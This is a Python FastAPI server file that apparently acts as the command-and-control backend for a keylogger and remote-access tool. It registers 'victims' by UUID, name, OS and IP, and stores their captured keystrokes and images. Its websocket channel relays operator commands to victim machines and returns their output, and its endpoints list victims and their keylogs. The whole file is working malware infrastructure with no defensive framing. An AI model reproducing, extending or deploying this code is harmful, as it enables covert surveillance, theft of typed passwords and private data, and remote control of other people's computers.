from fastapi import FastAPI, Response, WebSocket, WebSocketDisconnect, status, websockets
from models.victim import Victim
from data.db import db
from models.keylogs import Keylogs
from socketManager import manager
from fastapi.staticfiles import StaticFiles
import json

server = FastAPI()

server.mount("/web",StaticFiles(directory="../public", html=True), name="web")

@server.get("/", status_code=status.HTTP_204_NO_CONTENT, response_class=Response)
async def ping():
    return None


@server.post("/connect", status_code=status.HTTP_204_NO_CONTENT, response_class=Response)
async def connect(victim:Victim, response: Response):
    if db.victims.find_one({"UUID":victim.UUID}) is None:
        db.victims.insert_one({"UUID":victim.UUID, "name":victim.name, "OS":victim.OS, "IP":victim.IP})
        response.status_code = status.HTTP_201_CREATED
    else:
        db.victims.update_one({"UUID":victim.UUID}, {
            "$set":{
                "name":victim.name,
                "OS":victim.OS,
                "IP":victim.IP
            }})

@server.post("/keylogs", status_code=status.HTTP_200_OK, response_class=Response)
async def keylogs(keylogs:Keylogs,response:Response):
    db.keylogs.insert_one({"UUID":keylogs.UUID, "logs":keylogs.data, "timeStamp":keylogs.timeStamp, "img":keylogs.img})

sockets = manager.socketManager()

@server.websocket("/ws/{type}/{id}/")
async def sendCommand(type:str,id:str, socket:WebSocket):
    await socket.accept()
    if type == "server":
        sockets.connectServer(id, socket)
    else:
        sockets.connectVictim(id, socket)

    try:
        while True:
            data = await socket.receive_json()
            if data["type"] == "server":
                await sockets.sendCommand(data["id"], data["command"])
            else:
                    await sockets.recieveOutput(data["id"], data["output"])
    except WebSocketDisconnect:
        if type == "server":
            sockets.disconnectServer(id)
        else:
            sockets.disconnectVictim(id)

@server.get("/victims")
async def getVictims():
    victims = list(db.victims.find({},{'_id':False}))
    return {"data": victims, "size":len(victims)}

@server.get("/victim/{UUID}",status_code=status.HTTP_200_OK)
async def getVictimUIID(UUID:str,response:Response):
    victims = list(db.victims.find({"UUID":UUID},{'_id':False}))
    if(len(victims) == 0):
        response.status_code = status.HTTP_404_NOT_FOUND
        return None
    print(type(victims))
    return {"data": victims, "size":len(victims)}

@server.get("/victim/{UUID}/keylogs",status_code=status.HTTP_200_OK)
async def getVictimUIID(UUID:str,response:Response):
    victims = list(db.keylogs.find({"UUID":UUID},{'_id':False}).sort("timeStamp"))
    if(len(victims) == 0):
        response.status_code = status.HTTP_404_NOT_FOUND
        return None
    return {"data": victims, "size":len(victims)}